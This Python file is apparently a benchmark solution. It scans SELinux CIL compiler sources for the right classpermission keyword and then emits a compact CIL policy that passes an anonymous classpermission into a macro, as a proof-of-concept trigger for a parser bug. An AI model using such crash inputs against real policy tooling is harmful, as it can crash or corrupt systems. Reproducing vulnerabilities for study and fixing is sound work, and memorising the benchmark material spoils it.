import os
import io
import re
import tarfile
from typing import Optional


class Solution:
    def _read_text_from_tar(self, tar: tarfile.TarFile, member: tarfile.TarInfo, limit: int = 2_000_000) -> Optional[str]:
        if not member.isreg():
            return None
        if member.size <= 0 or member.size > limit:
            return None
        f = tar.extractfile(member)
        if f is None:
            return None
        data = f.read()
        try:
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return None

    def _detect_classperm_keyword(self, src_path: str) -> str:
        candidates = ["classpermission", "classperms", "classpermissions"]
        found = {k: False for k in candidates}

        def mark_from_text(txt: str):
            for k in candidates:
                if k in txt:
                    found[k] = True

        try:
            if os.path.isfile(src_path):
                with tarfile.open(src_path, "r:*") as tar:
                    for m in tar.getmembers():
                        n = m.name.lower()
                        if not (n.endswith(".l") or n.endswith(".y") or n.endswith(".c") or n.endswith(".h")):
                            continue
                        if "cil" not in n:
                            continue
                        if m.size > 2_000_000:
                            continue
                        txt = self._read_text_from_tar(tar, m)
                        if not txt:
                            continue
                        mark_from_text(txt)
                        if found["classpermission"]:
                            break
            elif os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    if "cil" not in root.lower():
                        continue
                    for fn in files:
                        lfn = fn.lower()
                        if not (lfn.endswith(".l") or lfn.endswith(".y") or lfn.endswith(".c") or lfn.endswith(".h")):
                            continue
                        p = os.path.join(root, fn)
                        try:
                            if os.path.getsize(p) > 2_000_000:
                                continue
                            with open(p, "rb") as f:
                                txt = f.read().decode("utf-8", errors="ignore")
                            mark_from_text(txt)
                            if found["classpermission"]:
                                raise StopIteration
                        except StopIteration:
                            raise
                        except Exception:
                            pass
        except StopIteration:
            pass
        except Exception:
            pass

        if found["classpermission"]:
            return "classpermission"
        if found["classperms"]:
            return "classperms"
        if found["classpermissions"]:
            return "classpermissions"
        return "classpermission"

    def solve(self, src_path: str) -> bytes:
        cp_kw = self._detect_classperm_keyword(src_path)

        # Keep it compact; avoid contexts/MLS. Trigger: anonymous classpermission passed into macro
        # that creates a classpermissionset using the parameter.
        poc = (
            "(user u)"
            "(role r)"
            "(type t)"
            "(userrole u r)"
            "(roletype r t)"
            "(class c (p))"
            f"(macro m(({cp_kw} x))(classpermissionset s x))"
            "(call m((c (p))))"
        )
        return poc.encode("utf-8")